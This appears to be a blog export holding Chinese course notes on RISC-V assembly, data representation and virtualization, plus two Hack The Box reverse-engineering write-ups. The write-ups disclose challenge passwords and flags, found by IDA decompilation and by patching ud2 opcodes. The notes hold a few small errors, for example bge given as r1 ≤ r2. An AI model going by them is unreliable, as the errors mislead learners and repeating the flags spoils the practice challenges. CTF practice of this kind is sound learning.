1or a,b,c 异或： 1xor a,b,c 移位（Shifts）： 移位操作分为2种： 1. 逻辑移位 logischer Shift ，用 &gt;&gt;, &lt;&lt;表示 用 0 填充空出的高位，无论原数是正数还是负数(Null Bits nachgeführt)，适用于 无符号数（unsigned numbers） 计算。 例子1： 假设 1t0 = 1111 1111 1111 1111 1111 1111 1110 0111 = -25（补码表示） 那么经过 1srl t0, t0, 4 会得到 1t0 = 0000 1111 1111 1111 1111 1111 1111 1110 = 268435454（正数） 例子2： 假设 1t0 = 0000 0000 0000 0000 0000 0000 0001 1001 # 25（十进制） 那么经过 1sll t0, t0, 4 会得到 1t0 = 0000 0000 0000 0000 0000 0001 1001 0000 = 400（正数） （$400 = 25 * 2^4$） 2. 算术移位 arithmetischen Shift，用 &gt;&gt;&gt;, &lt;&lt;&lt; 表示 会保持符号位（MSB）不变 (erhält Vorzeichen, 0 oder 1 nachgeführt) 如果是正数（MSB = 0），则用 0 填充高位。 如果是负数（MSB = 1），则用 1 填充高位。 适用于 有符号数（signed numbers） 计算，保持符号正确。 例子1： 假设 1t0 = 1111 1111 1111 1111 1111 1111 1110 0111 = -25（补码表示） 那么经过 1sra t0, t0, 4 会得到 1t0 = 1111 1111 1111 1111 1111 1111 1111 1110 = -2 (负数) 左移本质上就是乘法。无论有符号数还是无符号数，左移的行为都是相同的，所以 RISC-V 没有 sla指令。 这里的 uimm 会被限制在 5-bit 的无符号整数。 数据传输（Datentransfer）读取（Lesen vom Speicher）： ld (load word) 加载内存里的值 Format： 1ld destination, offset(base) 例子： 1ld a1, 8(s0) Basisadresse (s0) zum Offset (8) addieren, Adresse = ([Wert in s0] + 8) a1存储的是地址 (s0里存储的地址+8) 的值 la (load adress) 加载地址 （算伪命令， Pseudoinstruktion） 例子： 假如现在有 12345678.datavar: .word 42.text.globl mainmain: la a0, var # 把变量 var 的地址加载进 a0（例如 a0 = 0x10010000） lw a1, 0(a0) # 把 var 这个地址处的 4 字节内容（即 42）加载进 a1 那么最终结果为 12a0 = 地址，比如 0x10010000a1 = 42 写入（Schreiben in den Speicher）： sd (store word) Format： 1sd source, offset(base) 例子： 1sd a1, 8(s0) Basisadresse (s0) zum Offset (8) addieren, Adresse = ([Wert in s0] + 8) 跳转 Sprung无条件跳转12j immjr reg, imm 第一个会跳转到PC = PC + imm 第一个会跳转到PC = reg + imm 有条件跳转格式： 1bxx r1,r2,imm bxx的可选选项： branch if equal (beq)：$r1 = r2$ branch if not equal (bne)：$r1 \\neq r2$ branch if less than (blt)：$r1 &lt; r2$ branch if greater than or equal (bge)：$r1 \\leq r2$ 例子1（if）12345if (i == j)&#123; f = g + h;&#125;f = f – i; 跟上面这段c代码等价的RISC-V Assembler（汇编）： 123456# s0 = f, s1 = g, s2 = h# s3 = i, s4 = j bne s3, s4, L1 add s0, s1, s2L1: sub s0, s0, s3 例子2（if, else）1234if (i == j)&#123; f = g + h;&#125;else&#123; f = f - i;&#125; 跟上面这段c代码等价的RISC-V Assembler（汇编）： 12345678# s0 = f, s1 = g, s2 = h# s3 = i, s4 = j bne s3, s4, L1 add s0, s1, s2 j doneL1: sub s0, s0, s3done: 例子3（For 循环）123for (int i = 0; i &gt; 10; i++)&#123; ...&#125; 跟上面这段c代码等价的RISC-V Assembler（汇编）： 123456789101112 # 初始化 li t0, 0 # i=0loop_start: bge t0, a0, loop_end # i&gt;10 # 循环内容 addi t0, t0, 1 # i++ j loop_start loop_end: 例子4（while 循环）12345678// Berechne x, so dass// 2^x = 128int pow = 1;int x = 0;while (pow != 128) &#123;pow = pow * 2;x = x + 1;&#125; 跟上面这段c代码等价的RISC-V Assembler（汇编）： 12345678910# s0 = pow, s1 = x addi s0, zero, 1 add s1, zero, zero addi t0, zero, 128while: beq s0, t0, done slli s0, s0, 1 addi s1, s1, 1 j whiledone: 注意，这样写1addi t0, 128, zero 是不合法的，即非法指令 。详见后面的“带有立即数（immediate）的命令”。 子程序调用 UnterprogrammeBegriffe： Caller（调用者）：调用函数的代码（如 main()）。 Callee（被调用者）：被调用的函数（如 simple()）。 12jal reg, offset #调用jr ra #返回 例子： 12345678int main() &#123; simple(); a = b + c;&#125;void simple() &#123;return;&#125; 跟上面这段c代码等价的RISC-V Assembler（汇编）： 123450x00000300 main: jal simple # call0x00000304 add s0, s1, s2... ...0x0000051c simple: jr ra # return 其他的伪命令： 1mv ra, rb 跟 12add ra,rb,x0addi ra,rb,0 等价。 递归（Rekursion）普通递归例子1：阶乘 1234int factorial(int n) &#123; if (n == 0) return 1; return n * factorial(n - 1); // （递归调用后还有乘法,所以是非尾递归）&#125; 对应的RISC-V（n=4的情况示例）： 1234567891011121314151617181920212223 _start:0x200 addi a0, zero, 4 # a0 = 4，计算 4 的阶乘（作为输入参数）0x204 jal ra, magic # 跳转调用 magic 函数（递归实现阶乘），返回地址存入 ra0x208 ebreak # 程序断点（模拟器中用于停止执行） magic:0x20c beq a0, zero, break # 如果 a0 == 0，跳转到 break（0! = 1）0x210 addi sp, sp, -8 # 分配栈空间：只保存 ra 和 a0，所以是2*4=8Bits0x214 sw ra, 0(sp) # 保存返回地址 ra 到栈顶0x218 sw a0, 4(sp) # 保存当前参数 a0（n）0x21c addi a0, a0, -1 # a0 = a0 - 1，准备递归调用 magic(n-1)0x220 jal ra, magic # 递归调用 magic(n-1)，返回值仍存在 a0 中0x224 lw t0, 4(sp) # 从栈中恢复原来的 a0（也就是 n）0x228 mul a0, a0, t0 # a0 = a0 * n（也就是 n! = n * (n-1)!）0x22c lw ra, 0(sp) # 恢复之前保存的返回地址0x230 addi sp, sp, 8 # 回收栈空间0x234 jalr zero, 0(ra) # 返回调用者（函数返回） break:0x238 addi a0, zero, 1 # a0 = 1，返回 1（0! = 1）0x23c jalr zero, 0(ra) # 返回调用者 由于每次计算factorial(n)的值时需要先等factorial(n-1)的计算结果先出来，所以等待期间需要将所有的n都给存在stack里，也就是说： 123456789101112factorial(4) → 需要等factorial(3) 的结果 → 需要等 factorial(2) 的结果 → 需要等 factorial(1) 的结果 → 需要等 factorial(0) 的结果 → 返回 1然后开始回溯计算：factorial(1): 1 * 1 = 1factorial(2): 2 * 1 = 2factorial(3): 3 * 2 = 6factorial(4): 4 * 6 = 24 而栈结构如下： 12345678910111213+--------------------+| 0x4 || 0x208 |+--------------------+| 0x3 || 0x224 |+--------------------+| 0x2 || 0x224 |+--------------------+| 0x1 || 0x224 |+--------------------+ 返回的时候则是这样：当a0=0的时候触发0x20c的beq，跳转到break，break执行完了会跳转到当前的ra（也就是stack最底下一行的0x224），然后进行这部分操作： 123450x224 lw t0, 4(sp) # 从栈中恢复原来的 a0（也就是 n）0x228 mul a0, a0, t0 # a0 = a0 * n（也就是 n! = n * (n-1)!）0x22c lw ra, 0(sp) # 恢复之前保存的返回地址0x230 addi sp, sp, 8 # 回收栈空间0x234 jalr zero, 0(ra) # 返回调用者（函数返回） 计算a0 = 1*1然后继续跳转到stack倒数第三行的0x224，重复下去知道跳转到0x208，触发断点。 例子2：最大公约数 12345678unsigned ggT(unsigned a, unsigned b) &#123; if (a == b) return a; else if (a &lt; b) return ggT(a, b - a); else return ggT(a - b, b);&#125; 对应的RISC-V： 1234567891011121314151617181920ggT: beq a0, a1, finished # 如果 a0 == a1，则跳转到 finished（返回结果） bltu a0, a1, lt # 如果 a0 &lt; a1，则跳转到 lt 标签（交换顺序） sub a0, a0, a1 # 否则 a0 &gt; a1，执行 a0 = a0 - a1 j cont # 跳转到 cont，准备递归调用lt: sub a1, a1, a0 # 执行 b = b - a （即 a1 = a1 - a0）cont: addi sp, sp, -16 # 为返回地址创建栈空间（递归调用前保存返回地址） sw ra, 0(sp) # 保存返回地址 jal ra, ggT # 递归调用 ggT（jump and link） lw ra, 0(sp) # 恢复返回地址 addi sp, sp, 16 # 回收栈空间 jalr zero, 0(ra) # 返回（跳转回上层调用） finished: jalr zero, 0(ra) # 返回当前的 a0 作为结果 总结一下： 每个Recursive的函数递归部分会分成2部分： 从当前n的情况跳转到n-1，保存当前n的值以及返回地址（即当前跳转命令的下一行的地址） 读取返回地址并用当前已经计算出来的n-1的情况的值与n进行函数运算。 相当于递减完了之后还得递增回来。 注意，2个例子里分配的stack的大小是不一样的，这个主要是看ABI的具体要求，这里主要目的是示范而已。但不管大小如何，一定要保证分配的Stack大小和回收的大小是一致的。 尾递归（Tail Rekursiob）观察上面例子里stack存储的内容不难发现，如果递归的次数较高，则会很容易导致Stack Overflow。 为了解决这个问题，我们可以使用另一种递归方式：尾递归（Tail Rekursiob） 还是拿阶乘举例，我们将代码优化成这样： 1234int factorial(int n, int acc = 1) &#123; if (n == 0) return acc; return factorial(n - 1, n * acc); // 尾调用&#125; 对应的RISC-V： 123456789factorial: beqz a0, end_factorial mul a1, a0, a1 # acc = acc * n addi a0, a0, -1 # n = n-1 tail factorial # 尾调用（跳转，无需保存返回地址）end_factorial: mv a0, a1 # 返回结果 ret 这里的调用过程则会变成： 12345factorial(3, 1)→ 直接 tail call 到 factorial(2, 3)→ 再 tail call 到 factorial(1, 6)→ 再 tail call 到 factorial(0, 6)→ 结束：返回 acc = 6 栈结构如下： 12345678910+--------------------+| 当前调用（复用栈帧）|| n=3, acc=1 |→ tail call → 替换为：| n=2, acc=3 |→ tail call → 替换为：| n=1, acc=6 |→ tail call → 替换为：| n=0, acc=6 |→ return 6 不再需要存储所有中间的n的值。相当于是直接跳转而不是等待。 1234567891011121314 addi a0, zero, 4 # n = 4 addi a1, zero, 1 # acc = 1 call calc_tr ebreakcalc_tr: beq a0, zero, done # if (n == 0) return acc mul a1, a1, a0 # acc *= n addi a0, a0, -1 # n-- j calc_tr # tail call (jump)done: mv a0, a1 # return acc in a0 ret 带有立即数（immediate）的命令立即数（Immediate/Konstante）：由指令本身携带，不需要从寄存器或内容中加载 aadia = b + imm（一个立即数） 1addi a,b,&lt;imm&gt; 注意，RISC-V里是没有subi这种操作的，因为它可以被addi代替： subi a,b,x是等价于addi a,b,-x的（这里的x是一个立即数/常数）。 但sub不可以被add替代，是因为sub a,b,-c这个操作不合规（c是一个register，不存在-c这种操作）。 这里可以使用的立即数的大小会被限制在$[-2^{11},2^{11}) = [-2048,+2047]$ （具体原因会在之后机器码的部分阐述） 生成32位的常数由于RISC-V的指令长度通常是32位，所以没有办法通过一条指令将一个32位的立即数塞进寄存器里。于是我们需要用到 lui (load upper immediate)和addi这两条指令，将立即数拆成2部分，分2步存进寄存器里。 lui的作用是将一个常数加载到目标寄存器的高20位（bit）（也就是5个nibble），并将低12位（bit）填充为 0。 而addi则负责将低12位（bit）（也就是3个nibble）的数值加到目标寄存器中。 需要注意的是addi rd, rs1, imm12的imm12是 12-bit signed（范围 [-2048, 2047] ），会符号扩展后再相加。 整体流程： 把一个 32 位常数 C 拆成： lo = C &amp; 0xFFF （低 12 位，需要把unsigned解释成signed） 高位（高20位）分2种情况： 如果lo&lt;0x800，那么hi = C &gt;&gt; 12 （直接取高20位） 如果lo&gt;=0x800，那么hi = (C + 0x800) &gt;&gt; 12（取高20位，然后加1） 然后 12lui rd, hiaddi rd, rd, lo # lo 作为 12-bit signed 使用 关于这里的+ 0x800：如果lo &gt;= 0x800，那么低12位会被转成（解释成）负数，这个时候就需要提前进一位来抵消这个负数效果。 例子1： 1int a = 0xFEDC8765; 对应的汇编： 123# s0 = alui s0, 0xFEDC8 # s0 = 0xFEDC8000addi s0, s0, 0x765 例子2： 1int b = 0x1234FABC; lo = 0xABC大于0x800，所以需要提前进位。 对应的汇编： 12lui rd, 0x12350 # 注意这里是 0x1234F + 1addi rd, rd, -0x544 # -0x544(sign) == 0xABC(unsign) 此外需要注意指令的执行顺序： 12addi a0, zero, -534lui a0, 0 这段运行之后会得到a0的值为0，因为lui a0, 0不仅仅是会把低12位填 0，而是会把整个 a0 直接改写成0。 当然，为了避免麻烦，RISC-V专门提供了处理这种的快捷伪指令：li。上面这个例子可以直接写成： 1li a0, 0x1234FABC 汇编器会自动把它展开成类似上面的那种写法。 RISC-V 机器码 Machine Code/Instrunction将汇编语言翻译成机器码主要依靠下面这2张表： （由于是小端序，Little Endian存储的，所以直接理解成从右往左读就好。） 首先，所有的操作会被分成6个大类： Register/register (R) Immediate (I) Upper immediate (U) Store (S) Branch (B) 条件跳转 Jump (J) 然后会通过funct3以及funct7确定具体操作。（funct7更多的是为了扩展的操作/功能。） rs1, rs2, rd存储的是寄存器的地址，而imm存储的则是立即数（immediate）的数值。其中rd是目标寄存器。 例子： 1addi a1, a2,1 假设a1（rd），a2（rs1）的地址为00010，01010， 因为addi指令的opcode和funct3为：0010011, 000 ，这行命令会翻译成以下的机器码： 123imm[11:0] | rs1 | funct3 | rd | opcode------------|-------|--------|-------|--------000000000001| 01010 | 000 | 00010 | 0010011 Store, Branch, Jump 操作的格式里将imm的值拆成好几部分（比如说imm[11:5]和imm[4:0]）是为了其他内容的位置可以对齐，比如说rs2的位置都是第20-24bit。 Branch和Jump都是跳转操作，所以会将imm（跳转地址）的第一位（符号位）imm[12]或者imm[20]放在开头，以确定是向后跳转还是向前。然后因为RISC-V的命令都是32位的，也就是4Byte，所以所有地址都是4的倍数，也就不需要imm[0]的信息了，因为imm[0]始终等于0。 例题例题1Register s5 nullen 将寄存器s5的值设为0： 123mov s5, 0#或者是li s5, 0 例题2Wert in Register a1 nach s3 kopieren 将s3的值复制到s1里： 1mv s3, a1 例题3Dasunterste Bit von a0 nach t1 schreiben, restliche Bits sollen 0 sein 将 a0 的最低位写入 t1，其他位清零: 1andi t1, a0, 1 1在二进制中只有最后一位是1，其他位置都是0，所以a0的其他位置与0进行and操作都会得到0，而最后一位与1进行and操作会保留原本内容。 例题4Register s1 mit Einsen füllen 将寄存器 s1的值的每一位都设为 1： 1li s1, -1 因为-1 的二进制表示全 1 例题5Unterstes Byte von t0 nach a0 schreiben, Rest unverändert 将 t0 的最低字节写入 a0，保持其余部分不变： 12andi a0, a0, -256 # 清除 a0 的最低字节 (0xFFFFFF00)or a0, a0, t0 # 直接合并 t0 低字节 -256的二进制表示为 11111 1111 1111 1111 1111 1111 0000 0000 最后一个Byte的内容都是0，所以将它与a0进行and操作可以清除a0的最后一个Byte的内容，前面的保留。 然后将a0和t0直接进行or操作，会保留a0的前面部分，以及t0的最后一个Byte的内容。","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"ERA 计算机体系结构","slug":"TUM-info-课程笔记/ERA-计算机体系结构","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"Rechnerarchitektur","slug":"Rechnerarchitektur","permalink":"https://archer-baiyi.github.io/en/tags/Rechnerarchitektur/"},{"name":"计算机体系结构","slug":"计算机体系结构","permalink":"https://archer-baiyi.github.io/en/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"汇编语言","slug":"汇编语言","permalink":"https://archer-baiyi.github.io/en/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"name":"RISC-V","slug":"RISC-V","permalink":"https://archer-baiyi.github.io/en/tags/RISC-V/"}]},{"title":"1 Einführung und Datenrepräsentation","slug":"TUM info 笔记/ERA/ERA-1-Einfuhrung-und-Datenreprasentation","date":"2025-03-18T12:12:02.000Z","updated":"2025-04-26T18:30:23.988Z","comments":true,"path":"2025/03/18/TUM info 笔记/ERA/ERA-1-Einfuhrung-und-Datenreprasentation/","permalink":"https://archer-baiyi.github.io/en/2025/03/18/TUM%20info%20%E7%AC%94%E8%AE%B0/ERA/ERA-1-Einfuhrung-und-Datenreprasentation/","excerpt":"计算机体系结构基础相关笔记","text":"Einführung in die Rechnerarchitektur (ERA)DatendarstellungenZahlensystemeDezimalsystem Binärsystem Hexadezimalsystem Gängige Wortlängen Negative Ganze Zahlen假如专门用一个Bit来表示正负号（比如说)，这样子做会带来一个问题： 0 = 1+(-1) \\Longleftrightarrow 0000 0000 = 1000 0001 + 0000 0001 = 1000 0000所以一般使用Zweierkomplement，即Invertierung (Einerkomplement) + 1。 例子： 这样做的好处就是加法会非常自然： -1 + 1 = 1111 1111 + 0000 0001 = 1 0000 0000 \\rightarrow 0000 0000 = 0","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"ERA 计算机体系结构","slug":"TUM-info-课程笔记/ERA-计算机体系结构","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"Rechnerarchitektur","slug":"Rechnerarchitektur","permalink":"https://archer-baiyi.github.io/en/tags/Rechnerarchitektur/"},{"name":"计算机体系结构","slug":"计算机体系结构","permalink":"https://archer-baiyi.github.io/en/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}]},{"title":"HTB_rev Find The Easy Pass Writeup","slug":"CTF/Reverse Engineering/HTB-rev-Find-The-Easy-Pass-Writeup","date":"2025-03-16T21:39:15.000Z","updated":"2025-04-02T21:32:57.935Z","comments":true,"path":"2025/03/16/CTF/Reverse Engineering/HTB-rev-Find-The-Easy-Pass-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/03/16/CTF/Reverse%20Engineering/HTB-rev-Find-The-Easy-Pass-Writeup/","excerpt":"","text":"这道题会给我们一个exe文件，打开是一个判断输入的密码是否正确的软件： 我们用IDA打开它，会发现并没有反编译出main()函数。所以我们随便输入一点内容试一下： 会返回Wrong Password!字样。接着我们尝试用IDA搜索这段内容，会发现： 点击第二个结果会跳转到： 注意到它的上方有着”Goob Job. Congratulation”的字样，我们猜测这是输入成功后返回的内容，所以我们点击它下方 XREF的内容，查看这个变量在哪里被调用过，通过反汇编会得到以下内容：12345678910111213141516171819202122232425262728293031323334353637383940414243int __fastcall TForm1_Button1Click(int a1)&#123; int v2; // ecx int v3; // edx char v4; // zf unsigned int v6[2]; // [esp-Ch] [ebp-38h] BYREF int *v7; // [esp-4h] [ebp-30h] int v8; // [esp+4h] [ebp-28h] BYREF int v9; // [esp+8h] [ebp-24h] BYREF int v10; // [esp+Ch] [ebp-20h] BYREF int v11; // [esp+10h] [ebp-1Ch] BYREF int v12; // [esp+14h] [ebp-18h] BYREF int v13; // [esp+18h] [ebp-14h] BYREF int v14; // [esp+1Ch] [ebp-10h] BYREF int v15; // [esp+20h] [ebp-Ch] BYREF int v16; // [esp+24h] [ebp-8h] BYREF int v17; // [esp+28h] [ebp-4h] BYREF int savedregs; // [esp+2Ch] [ebp+0h] BYREF v7 = &amp;savedregs; v6[1] = (unsigned int)&amp;loc_454171; v6[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v6); System::__linkproc__ LStrLAsg(&amp;v16, &amp;str_f[1]); System::__linkproc__ LStrLAsg(&amp;v15, &amp;str_o[1]); System::__linkproc__ LStrLAsg(&amp;v14, &amp;str_r[1]); System::__linkproc__ LStrLAsg(&amp;v13, &amp;str_t[1]); System::__linkproc__ LStrLAsg(&amp;v12, &amp;str_r[1]); System::__linkproc__ LStrLAsg(&amp;v11, &amp;str_a[1]); System::__linkproc__ LStrLAsg(&amp;v10, &amp;str_n[1]); System::__linkproc__ LStrLAsg(&amp;v9, &amp;str___13[1]); System::__linkproc__ LStrCatN(&amp;v17, 8, v2, v15, v14, v13, v12, v11, v10, v9); Controls::TControl::GetText(*(Controls::TControl **)(a1 + 760)); System::__linkproc__ LStrCmp(v8, v17); if ( v4 ) Dialogs::ShowMessage((Dialogs *)&amp;str_Good_Job__Congr[1], v3); else Dialogs::ShowMessage((Dialogs *)&amp;str_Wrong_Password_[1], v3); __writefsdword(0, v6[0]); v7 = (int *)&amp;loc_454178; System::__linkproc__ LStrClr(&amp;v8); return System::__linkproc__ LStrArrayClr(&amp;v9, 9);&#125; 这段代码的主要逻辑是将这些赋值变量 123456789System::__linkproc__ LStrLAsg(&amp;v16, &amp;str_f[1]);System::__linkproc__ LStrLAsg(&amp;v15, &amp;str_o[1]);System::__linkproc__ LStrLAsg(&amp;v14, &amp;str_r[1]);System::__linkproc__ LStrLAsg(&amp;v13, &amp;str_t[1]);System::__linkproc__ LStrLAsg(&amp;v12, &amp;str_r[1]);System::__linkproc__ LStrLAsg(&amp;v11, &amp;str_a[1]);System::__linkproc__ LStrLAsg(&amp;v10, &amp;str_n[1]);System::__linkproc__ LStrLAsg(&amp;v9, &amp;str___13[1]); 拼接成一个新的字符串 v17 1System::__linkproc__ LStrCatN(&amp;v17, 8, v2, v15, v14, v13, v12, v11, v10, v9); 然后比较输入的字符串与v17。所以我们只需要查看那些赋值字符串的具体值便可得到密码：fortran! 按照题目要求flag内容为：HTB{fortran!}。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Reverse Engineering","slug":"CTF/Reverse-Engineering","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Reverse-Engineering/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://archer-baiyi.github.io/en/tags/Reverse-Engineering/"}]},{"title":"HTB_rev Behind the Scenes Writeup","slug":"CTF/Reverse Engineering/HTB-rev-Behind-the-Scenes-Writeup","date":"2025-03-12T01:22:42.000Z","updated":"2025-04-02T21:33:08.443Z","comments":true,"path":"2025/03/12/CTF/Reverse Engineering/HTB-rev-Behind-the-Scenes-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/03/12/CTF/Reverse%20Engineering/HTB-rev-Behind-the-Scenes-Writeup/","excerpt":"","text":"用010 Editor （或者Hex Editor之类的都行）打开源文件，将里面所有的 0F 0B （即 ud2 ）改为 90 90 （90即NOP，是Machine Code中表示 无操作 (No Operation) 的命令），然后再用IDA打开文件即可看到完整的代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051int __fastcall main(int argc, const char **argv, const char **envp){ struct sigaction s; // [rsp+10h] [rbp-A0h] BYREF unsigned __int64 v5; // [rsp+A8h] [rbp-8h] v5 = __readfsqword(0x28u); memset(&amp;s, 0, sizeof(s)); sigemptyset(&amp;s.sa_mask); s.sa_handler = (__sighandler_t)segill_sigaction; s.sa_flags = 4; sigaction(4, &amp;s, 0LL); if ( argc == 2 ) { if ( strlen(argv[1]) == 12 ) { if ( !strncmp(argv[1], \"Itz\", 3uLL) ) { if ( !strncmp(argv[1] + 3, \"_0n\", 3uLL) ) { if ( !strncmp(argv[1] + 6, \"Ly_\", 3uLL) ) { if ( !strncmp(argv[1] + 9, \"UD2\", 3uLL) ) printf(\"&gt; HTB{%s}\\n\", argv[1]); return 0; } else { return 0; } } else { return 0; } } else { return 0; } } else { return 0; } } else { puts(\"./challenge &lt;password&gt;\"); return 1; }} 所以flag为 1HTB{Itz_0nLy_UD2}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Reverse Engineering","slug":"CTF/Reverse-Engineering","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Reverse-Engineering/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://archer-baiyi.github.io/en/tags/Reverse-Engineering/"}]},{"title":"GBS 9 Virtualisierung 虚拟化","slug":"TUM info 笔记/GBS/GBS-9-Virtualisierung-虚拟化","date":"2025-03-11T17:17:37.000Z","updated":"2025-04-26T18:31:20.121Z","comments":true,"path":"2025/03/11/TUM info 笔记/GBS/GBS-9-Virtualisierung-虚拟化/","permalink":"https://archer-baiyi.github.io/en/2025/03/11/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-9-Virtualisierung-%E8%99%9A%E6%8B%9F%E5%8C%96/","excerpt":"操作系统基础相关笔记","text":"Einführung Abstraktionssichten: 复杂系统可以通过抽象层更好地描述。 Fokus auf relevante Funktionalitäten 抽象层通过接口（Interfaces）相互分离（durch Schnittstellen (Interfaces) voneinander getrennt）： 使得每一层可以独立开发和实现，并且高层系统只需要与接口交互，而不需要了解底层实现。 z.B. Systemcalls: Implementierung durch Interface verborgen ： 只需要直接用read(), write()这些命令，不需要关注/知道这些调用在内核中的具体实现。 Interfaces können die Software Sicht auf die Hardware definieren ：软件可以通过接口来访问硬件，而无需直接操作硬件。 Interfaces Instruction Set Architecture (ISA): 指令集架构 Interface zwischen dem BS und Hardware 是操作系统与硬件之间的接口 besteht aud User- und System-ISA Application Binary Interface (ABI): 应用二进制接口 Interface zwischen Anwendungen und dem Betriebssystem 是应用程序与操作系统之间的接口 besteht aus dem System Call Interface und der User ISA Die Sicht auf das System hängt von der Software-Perspektive ab： 如果是开发操作系统的话，则需要考虑操作系统与硬件的交互接口（isa）； 而如果是开发普通软件的话，则更关注软件与操作系统的接口（abi），相当于通过操作系统来访问硬件。 Ein Hardware-System (physische Maschine) bietet eine Laufzeitumgebung für die darüberliegende Software： BS virtualisiert bereits: Prozesse, virtueller Speicher und Abstraktionen Eine Virtuelle Maschine implementiert eine virtuelle Laufzeitumgebung： Abbilden von virtuellen auf physische Ressourcen 虚拟运行环境的分类 System Virtual Machines（系统虚拟机） 虚拟化整个系统 Process Virtual Machines（进程虚拟机） 仅为单个进程提供虚拟环境 Anforderungen an Virtualisierung 对虚拟化的要求 Equivalences / Fidelity：等效性 虚拟化应该让操作系统和应用程序无需特殊修改（或者最小程度的改动）便可以在虚拟机上运行。 Resource Control / Safety (Isolation)： 隔离性 必须确保虚拟机（的资源）彼此不会影响；Hypervisor需要控制所有底层资源 Efficiency / Performance：性能 大部分指令应该直接在硬件上执行 系统虚拟机 （System Virtual Machines）我们为什么需要系统虚拟机？ 模拟（Emulation） 使得操作系统可以在不同的 ISA上运行，并且在虚拟机中调试操作系统通常比在物理硬件（裸机）上更方便。 隔离（Isolation） 受损或遭到攻击的 Guest OS 无法影响其他虚拟机，也无法修改 Hypervisor 本身。 安全性（Sicherheit） Hypervisor 更容易保护（代码量较小、权限较高）。 资源利用（Ressourcennutzung） 物理硬件资源可以更好（更灵活）地分配和利用。 Hypervisor / Virtual Machine Monitor (VMM) 虚拟机监控器Hypervisor负责给操作系统提供运行环境，通常会分为2类： Typ 1 Hypervisor /Bare-Metal-Hypervisor （裸机式） 直接在物理硬件上运行容器，没有额外虚拟化层的存在。这种方式的主要优点在于性能的极致优化，因为没有虚拟化带来的开销。 比如 Xen, Hyper-V, VMware ESX。 Typ 2 Hypervisor （托管式） 依赖于宿主操作系统的服务（ Verwendet Dienste des Host-BS）。 比如 KVM, VirtualBox, VMware Workstation。 Hypervisor实现了一个虚拟的 ISA，同样分User- 和 System-ISA。 Hypervisor虚拟化整个物理机器，并且提供虚拟化硬件作为借口让Gast-BS可以在上面运行。可以使得Gast-BS以为/产生错觉（Illusion）自己对硬件拥有完整的控制权。但实际上对于Hypervisor来说，Gast-BS就只是个软件而已。 这样做的好处就是一个虚拟机可以运行任意操作系统，并且可以同时运行多个相同或不同的操作系统。 Hypervisor 负责控制和虚拟化系统的硬件资源： CPU 虚拟化（CPU-Virtualisierung） 内存虚拟化（Speicher-Virtualisierung） I/O 虚拟化（I/O-Virtualisierung） 并需要确保Gast-BS不能访问未分配给它的资源。 CPU 虚拟化（CPU-Virtualisierung）CPU 的虚拟化方法一般是分以下3种： 半虚拟化（Paravirtualization）： 使用经过修改的操作系统 在虚拟机（VM）中运行，该 OS 知道自己处于虚拟化环境中。 设备驱动程序（Geräte Treiber）会通过 Hypercalls 与Hypervisor进行交互。 二进制翻译（Binary Translation）： 可以运行未经修改的操作系统，甚至可以在不同架构上运行（例如 x86 上模拟 ARM）。 Hypervisor会解释/模拟Gast-BS的部分二进制代码，所以会导致性能开销（Performance-Overhead） 这种Hypervisor的实现非常复杂。 硬件辅助虚拟化（Hardware-assisted Virtualization） 可以运行未经修改的操作系统，可以实现高效的虚拟机（effizienten VMs），减少性能损失。所以是目前最主流的。 与普通操作系统中的内核空间（Kernel Space）与用户空间（User Space）不同（但相似）的是，我们这里会讨论的是高权限的 系统模式（System Mode） 和 用户模式（User Mode）。Hypervisor 会在系统模式（System Mode）运行，而Guest-BS则是会在用户模式（User Mode）运行。 某些在用户模式下执行的指令会被 Hypervisor 在系统模式下拦截，以确保Hypervisor 拥有对虚拟机的完全控制。 （套娃，User Mode里又有Virtual User Mode 和Virtual System Mode。） ISA中的指令可以分为以下3类： 特权指令（Privileged Instructions）： 只能在系统模式（System Mode）下执行。 如果在用户模式（User Mode）下执行，则会触发陷阱（Trap），由 Hypervisor 处理。 敏感指令（Sensitive Instructions）： 其中又分为 控制敏感指令（Control-Sensitive Instructions）：将修改系统配置（例如 修改页表（Page Tables）） 与行为敏感指令（Behaviour-Sensitive Instructions）：这些指令在不同模式下（用户模式 vs. 系统模式）的行为也是不同的。 